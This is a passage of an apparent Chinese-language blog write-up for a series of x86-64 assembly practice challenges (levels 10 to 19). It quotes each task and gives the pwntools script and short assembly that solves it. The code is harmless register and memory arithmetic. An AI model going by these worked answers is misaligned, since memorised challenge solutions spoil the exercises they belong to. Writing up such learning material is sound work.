允许你对寄存器逐位执行逻辑操作。<br><br>为了说明这个例子，假设寄存器只存储 <span class="hljs-number">8</span> 位。<br><br>rax 和 rbx 中的值为：  <br>rax = <span class="hljs-number">10101010</span>  <br>rbx = <span class="hljs-number">00110011</span><br><br>如果我们使用 <span class="hljs-string">&quot;and rax, rbx&quot;</span> 指令对 rax 和 rbx 进行按位与运算，结果将通过逐位进行与运算来计算，因此被称为位逻辑。<br><br>所以从左到右：  <br><span class="hljs-number">1</span> AND <span class="hljs-number">0</span> = <span class="hljs-number">0</span>  <br><span class="hljs-number">0</span> AND <span class="hljs-number">0</span> = <span class="hljs-number">0</span>  <br><span class="hljs-number">1</span> AND <span class="hljs-number">1</span> = <span class="hljs-number">1</span>  <br><span class="hljs-number">0</span> AND <span class="hljs-number">1</span> = <span class="hljs-number">0</span>  <br>...<br><br>最后我们将结果组合在一起得到：  <br>rax = <span class="hljs-number">00100010</span><br><br>以下是一些参考的真值表：  <br><br>      AND          OR           XOR<br>   A | <span class="hljs-type">B</span> | <span class="hljs-type">X</span>    A | <span class="hljs-type">B</span> | <span class="hljs-type">X</span>    A | <span class="hljs-type">B</span> | <span class="hljs-type">X</span><br>  ---+---+---  ---+---+---  ---+---+---<br>   <span class="hljs-number">0</span> | <span class="hljs-type">0</span> | <span class="hljs-type">0</span>    <span class="hljs-number">0</span> | <span class="hljs-type">0</span> | <span class="hljs-type">0</span>    <span class="hljs-number">0</span> | <span class="hljs-type">0</span> | <span class="hljs-type">0</span><br>   <span class="hljs-number">0</span> | <span class="hljs-type">1</span> | <span class="hljs-type">0</span>    <span class="hljs-number">0</span> | <span class="hljs-type">1</span> | <span class="hljs-type">1</span>    <span class="hljs-number">0</span> | <span class="hljs-type">1</span> | <span class="hljs-type">1</span><br>   <span class="hljs-number">1</span> | <span class="hljs-type">0</span> | <span class="hljs-type">0</span>    <span class="hljs-number">1</span> | <span class="hljs-type">0</span> | <span class="hljs-type">1</span>    <span class="hljs-number">1</span> | <span class="hljs-type">0</span> | <span class="hljs-type">1</span><br>   <span class="hljs-number">1</span> | <span class="hljs-type">1</span> | <span class="hljs-type">1</span>    <span class="hljs-number">1</span> | <span class="hljs-type">1</span> | <span class="hljs-type">1</span>    <span class="hljs-number">1</span> | <span class="hljs-type">1</span> | <span class="hljs-type">0</span><br><br>在不使用以下指令的情况下：  <br>mov, xchg<br><br>请执行以下操作：  <br>rax = rdi AND rsi<br><br>即将 rax 设置为 (rdi AND rsi) 的值。<br><br>现在，我们将进行以下设置以准备你的代码：  <br>rdi = <span class="hljs-number">0x953236d544892262</span>  <br>rsi = <span class="hljs-number">0x57539fb8540f1b4b</span><br></code></pre></td></tr></table></figure><ul><li>rdi和rsi异或之后值被存在rdi中</li><li>rax使用xor清零</li><li>rdi和rax使用或运算，从而将rax被赋值为rdi的值</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 设置架构</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># 创建一个进程对象并运行二进制文件</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># 接收并丢弃一行输出</span><br>p.recvline()<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    xor rax,rax</span><br><span class="hljs-string">    and rdi,rsi</span><br><span class="hljs-string">    or rax, rdi</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># 发送汇编指令给进程</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># 打印进程的输出</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="11"><a href="#11" class="headerlink" title="11"></a>11</h1><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">在这个关卡中，你将使用寄存器进行操作。你将被要求修改或读取寄存器的值。<br><br>在每次运行之前，我们将动态地在内存中设置一些值。每次运行时，这些值都会改变。这意味着你需要使用寄存器进行一些公式化的操作。我们会事先告诉你哪些寄存器被设置了，以及你应该把结果放在哪里。在大多数情况下，结果应该存储在<span class="hljs-built_in">rax</span>寄存器中。<br><br>在这个关卡中，你将使用位逻辑和操作。这将涉及与存储在寄存器或内存位置中的位直接交互的大量操作。你还可能需要使用x86的逻辑指令：<span class="hljs-keyword">and</span>、<span class="hljs-keyword">or</span>、<span class="hljs-keyword">not</span>、<span class="hljs-keyword">xor</span>。<br><br>只能使用以下指令：<br><span class="hljs-keyword">and</span>、<span class="hljs-keyword">or</span>、<span class="hljs-keyword">xor</span><br><br>实现以下逻辑：<br>如果x是偶数，则y等于<span class="hljs-number">1</span>；否则，y等于<span class="hljs-number">0</span>。<br><br>其中：<br>x = <span class="hljs-built_in">rdi</span><br>y = <span class="hljs-built_in">rax</span><br><br>现在，我们将按照以下方式设置参数，以便你编写代码：<br><span class="hljs-built_in">rdi</span> = <span class="hljs-number">0x3a0610d0</span><br></code></pre></td></tr></table></figure><ul><li>rdi与1与运算可以判断rdi的奇偶<ul><li>为1：奇数</li><li>为0：偶数</li></ul></li><li>把刚刚得到的rdi的最后一位赋值给rax</li><li>rax与1异或即可</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 设置架构</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># 创建一个进程对象并运行二进制文件</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># 接收并丢弃一行输出</span><br>p.recvline()<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    and rdi,1</span><br><span class="hljs-string">    xor rax,rax</span><br><span class="hljs-string">    or rax,rdi</span><br><span class="hljs-string">    xor rax,1</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># 发送汇编指令给进程</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># 打印进程的输出</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="12"><a href="#12" class="headerlink" title="12"></a>12</h1><p>地址中数据传输到寄存器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 设置架构</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># 创建一个进程对象并运行二进制文件</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># 接收并丢弃一行输出</span><br>p.recvline()<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rax, [0x404000]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># 发送汇编指令给进程</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># 打印进程的输出</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="13"><a href="#13" class="headerlink" title="13"></a>13</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 设置架构</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># 创建一个进程对象并运行二进制文件</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># 接收并丢弃一行输出</span><br>p.recvline()<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rax, [0x404000]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># 发送汇编指令给进程</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># 打印进程的输出</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="14"><a href="#14" class="headerlink" title="14"></a>14</h1><p>无法对内存直接进行运算操作，需要寄存器进行中转</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 设置架构</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># 创建一个进程对象并运行二进制文件</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># 接收并丢弃一行输出</span><br>p.recvline()<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rax,[0x404000]</span><br><span class="hljs-string">    mov rdi,[0x404000]</span><br><span class="hljs-string">    mov rdi,0x1337</span><br><span class="hljs-string">    add [0x404000],rdi</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># 发送汇编指令给进程</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># 打印进程的输出</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="15"><a href="#15" class="headerlink" title="15"></a>15</h1><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">回想一下，在x86_64中，寄存器的宽度为<span class="hljs-number">64</span>位，意味着它们可以存储<span class="hljs-number">64</span>位。<br><br>同样，每个内存位置可以被视为一个<span class="hljs-number">64</span>位的值。<br><br>我们将<span class="hljs-number">64</span>位（<span class="hljs-number">8</span>字节）的内容称为<span class="hljs-string">&quot;quad word&quot;</span>。<br><br>下面是内存大小的名称及其对应的字节数：  <br>Quad <span class="hljs-built_in">Word</span> = <span class="hljs-number">8</span>字节 = <span class="hljs-number">64</span>位  <br>Double <span class="hljs-built_in">Word</span> = <span class="hljs-number">4</span>字节 = <span class="hljs-number">32</span>位  <br><span class="hljs-built_in">Word</span> = <span class="hljs-number">2</span>字节 = <span class="hljs-number">16</span>位  <br><span class="hljs-built_in">Byte</span> = <span class="hljs-number">1</span>字节 = <span class="hljs-number">8</span>位<br><br>在x86_64中，当解引用一个地址时，你可以访问每个这些大小，就像使用更大或更小的寄存器访问一样：  <br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, [address] &lt;=&gt; 将地址中的最低有效字节移动到<span class="hljs-built_in">rax</span>寄存器  <br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>, [address] &lt;=&gt; 将地址中的最低有效字移动到<span class="hljs-built_in">rax</span>寄存器  <br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>, [address] &lt;=&gt; 将地址中的最低有效双字移动到<span class="hljs-built_in">rax</span>寄存器  <br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, [address] &lt;=&gt; 将地址中的完整quad <span class="hljs-built_in">word</span>移动到<span class="hljs-built_in">rax</span>寄存器<br><br>请执行以下操作：  <br>将<span class="hljs-built_in">rax</span>寄存器设置为<span class="hljs-number">0x404000</span>处的字节。<br><br>现在，我们将按照以下方式设置参数，以便你编写代码：  <br>[<span class="hljs-number">0x404000</span>] = <span class="hljs-number">0x1a4b04</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 设置架构</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># 创建一个进程对象并运行二进制文件</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># 接收并丢弃一行输出</span><br>p.recvline()<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov al, [0x404000]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># 发送汇编指令给进程</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># 打印进程的输出</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="16"><a href="#16" class="headerlink" title="16"></a>16</h1><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">在这个关卡中，你将使用内存进行操作。这将要求你读取或写入线性存储在内存中的数据。如果你感到困惑，请去看一下<span class="hljs-string">&quot;ike&quot;</span>中的线性寻址模块。你可能还会被要求多次解引用，以使用我们动态放置在内存中的数据。<br><br>回想一下，以下是内存大小的名称及其对应的字节数：<br>  Quad <span class="hljs-built_in">Word</span>   = <span class="hljs-number">8</span>字节 = <span class="hljs-number">64</span>位<br>  Double <span class="hljs-built_in">Word</span> = <span class="hljs-number">4</span>字节 = <span class="hljs-number">32</span>位<br>  <span class="hljs-built_in">Word</span>        = <span class="hljs-number">2</span>字节 = <span class="hljs-number">16</span>位<br>  <span class="hljs-built_in">Byte</span>        = <span class="hljs-number">1</span>字节 = <span class="hljs-number">8</span>位<br><br>在x86_64中，当解引用一个地址时，你可以访问每个这些大小，就像使用更大或更小的寄存器访问一样：<br>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, [address]        &lt;=&gt;        将地址中的最低有效字节移动到<span class="hljs-built_in">rax</span>寄存器<br>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>, [address]        &lt;=&gt;        将地址中的最低有效字移动到<span class="hljs-built_in">rax</span>寄存器<br>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>, [address]       &lt;=&gt;        将地址中的最低有效双字移动到<span class="hljs-built_in">rax</span>寄存器<br>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, [address]       &lt;=&gt;        将地址中的完整quad <span class="hljs-built_in">word</span>移动到<span class="hljs-built_in">rax</span>寄存器<br><br>请执行以下操作：<br>- 将<span class="hljs-built_in">rax</span>寄存器设置为<span class="hljs-number">0x404000</span>处的字节。<br>- 将<span class="hljs-built_in">rbx</span>寄存器设置为<span class="hljs-number">0x404000</span>处的字。<br>- 将<span class="hljs-built_in">rcx</span>寄存器设置为<span class="hljs-number">0x404000</span>处的双字。<br>- 将<span class="hljs-built_in">rdx</span>寄存器设置为<span class="hljs-number">0x404000</span>处的quad <span class="hljs-built_in">word</span>。<br><br>现在，我们将按照以下方式设置参数，以便你编写代码：<br>[<span class="hljs-number">0x404000</span>] = <span class="hljs-number">0x845bcb141d380894</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 设置架构</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># 创建一个进程对象并运行二进制文件</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># 接收并丢弃一行输出</span><br>p.recvline()<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">       mov al,[0x404000]</span><br><span class="hljs-string">   mov bx,[0x404000]</span><br><span class="hljs-string">   mov ecx,[0x404000]</span><br><span class="hljs-string">   mov rdx,[0x404000]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># 发送汇编指令给进程</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># 打印进程的输出</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="17"><a href="#17" class="headerlink" title="17"></a>17</h1><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">值得注意的是，正如你可能已经注意到的，值以与我们表示的顺序相反的方式存储。<br><br>举个例子，假设：  <br>[<span class="hljs-number">0x1330</span>] = <span class="hljs-number">0x00000000deadc0de</span><br><br>如果你检查它在内存中的实际表示，你会看到：  <br>[<span class="hljs-number">0x1330</span>] = <span class="hljs-number">0xde</span>  <br>[<span class="hljs-number">0x1331</span>] = <span class="hljs-number">0xc0</span>  <br>[<span class="hljs-number">0x1332</span>] = <span class="hljs-number">0xad</span>  <br>[<span class="hljs-number">0x1333</span>] = <span class="hljs-number">0xde</span>  <br>[<span class="hljs-number">0x1334</span>] = <span class="hljs-number">0x00</span>  <br>[<span class="hljs-number">0x1335</span>] = <span class="hljs-number">0x00</span>  <br>[<span class="hljs-number">0x1336</span>] = <span class="hljs-number">0x00</span>  <br>[<span class="hljs-number">0x1337</span>] = <span class="hljs-number">0x00</span><br><br>在x86中，以这种<span class="hljs-string">&quot;反向&quot;</span>存储的格式存储数据是有意义的，这被称为<span class="hljs-string">&quot;Little Endian&quot;</span>。<br><br>在这个挑战中，我们会在每次运行时给你两个动态创建的地址。<br><br>第一个地址将被放置在<span class="hljs-built_in">rdi</span>寄存器中。  <br>第二个地址将被放置在<span class="hljs-built_in">rsi</span>寄存器中。<br><br>根据前面提到的信息，执行以下操作：<br><br>- 将[<span class="hljs-built_in">rdi</span>]设置为<span class="hljs-number">0xdeadbeef00001337</span>。<br>- 将[<span class="hljs-built_in">rsi</span>]设置为<span class="hljs-number">0xc0ffee0000</span>。<br><br>提示：可能需要一些技巧将一个大常数赋值给解引用的寄存器。  <br>尝试将一个寄存器设置为常数值，然后将该寄存器赋值给解引用的寄存器。<br><br>现在，我们将按照以下方式设置参数，以便你编写代码：  <br>[<span class="hljs-number">0x404208</span>] = <span class="hljs-number">0xffffffffffffffff</span>  <br>[<span class="hljs-number">0x404c38</span>] = <span class="hljs-number">0xffffffffffffffff</span>  <br><span class="hljs-built_in">rdi</span> = <span class="hljs-number">0x404208</span>  <br><span class="hljs-built_in">rsi</span> = <span class="hljs-number">0x404c38</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 设置架构</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># 创建一个进程对象并运行二进制文件</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># 接收并丢弃一行输出</span><br>p.recvline()<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">       mov rax,0xdeadbeef00001337</span><br><span class="hljs-string">       mov [rdi],rax</span><br><span class="hljs-string">       mov rax,0xc0ffee0000</span><br><span class="hljs-string">       mov [rsi],rax</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># 发送汇编指令给进程</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># 打印进程的输出</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="18"><a href="#18" class="headerlink" title="18"></a>18</h1><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">回想一下，内存是按线性方式存储的。<br><br>这是什么意思？<br><br>假设我们访问地址 <span class="hljs-number">0x1337</span> 处的四字节数据：  <br>[<span class="hljs-number">0x1337</span>] = <span class="hljs-number">0x00000000deadbeef</span><br><br>实际上，内存是以字节为单位按顺序存储的，采用小端模式：  <br>[<span class="hljs-number">0x1337</span>] = <span class="hljs-number">0xef</span>  <br>[<span class="hljs-number">0x1337</span> + <span class="hljs-number">1</span>] = <span class="hljs-number">0xbe</span>  <br>[<span class="hljs-number">0x1337</span> + <span class="hljs-number">2</span>] = <span class="hljs-number">0xad</span>  <br>...  <br>[<span class="hljs-number">0x1337</span> + <span class="hljs-number">7</span>] = <span class="hljs-number">0x00</span><br><br>这对我们有什么好处？<br><br>这意味着我们可以使用偏移量来访问相邻的数据，就像上面展示的那样。<br><br>假设你想要从一个地址中获取第<span class="hljs-number">5</span>个字节，你可以这样访问：  <br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, [address+<span class="hljs-number">4</span>]<br><br>请记住，偏移量从<span class="hljs-number">0</span>开始。<br><br>执行以下操作：  <br>从存储在 <span class="hljs-built_in">rdi</span> 中的地址中加载两个连续的四字数据  <br>计算前面步骤的四字数据的和。  <br>将和存储在 <span class="hljs-built_in">rsi</span> 中的地址中<br><br>现在，我们将进行以下设置以准备你的代码：  <br>[<span class="hljs-number">0x4041a8</span>] = <span class="hljs-number">0xbdc4b</span>  <br>[<span class="hljs-number">0x4041b0</span>] = <span class="hljs-number">0x12b14</span>  <br><span class="hljs-built_in">rdi</span> = <span class="hljs-number">0x4041a8</span>  <br><span class="hljs-built_in">rsi</span> = <span class="hljs-number">0x404658</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 设置架构</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># 创建一个进程对象并运行二进制文件</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># 接收并丢弃一行输出</span><br>p.recvline()<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">       mov rax,[rdi]</span><br><span class="hljs-string">       add rax,[rdi+8]</span><br><span class="hljs-string">       mov [rsi],rax</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># 发送汇编指令给进程</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># 打印进程的输出</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="19"><a href="#19" class="headerlink" title="19"></a>19</h1><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 